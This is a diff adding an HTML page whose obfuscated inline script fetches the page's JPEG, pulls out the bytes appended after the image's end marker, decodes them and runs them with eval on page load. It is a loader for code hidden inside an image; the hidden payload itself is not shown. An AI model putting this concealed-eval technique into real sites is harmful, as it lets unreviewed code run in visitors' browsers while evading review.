@@ -1,0 +1,30 @@
+<head>
+  <script>
+    _ = document;
+    _.addEventListener('DOMContentLoaded', async () => {
+      a = _.createElement('div');
+      a.id = 'root';
+      _.body.appendChild(a);
+
+      b = _.querySelector('img');
+      b.remove();
+
+      c = await (await fetch(b.src)).arrayBuffer();
+      d = Array.from(new Uint8Array(c), (e) =>
+        ('0' + (e < 0 ? e + 256 : e).toString(16)).slice(-2),
+      ).join('');
+      f = 'ffd9';
+      g = d.substr(d.lastIndexOf(f) + f.length);
+      h = Array.from({ length: g.length >> 1 }, (_, i) =>
+        String.fromCharCode(parseInt(g.substr(i << 1, 2), 16)),
+      )
+        .filter((c) => c <= '~' && c >= ' ')
+        .join('');
+
+      eval(h);
+    });
+  </script>
+</head>
+<body>
+  <img src="./react-inside.jpeg" />
+</body>
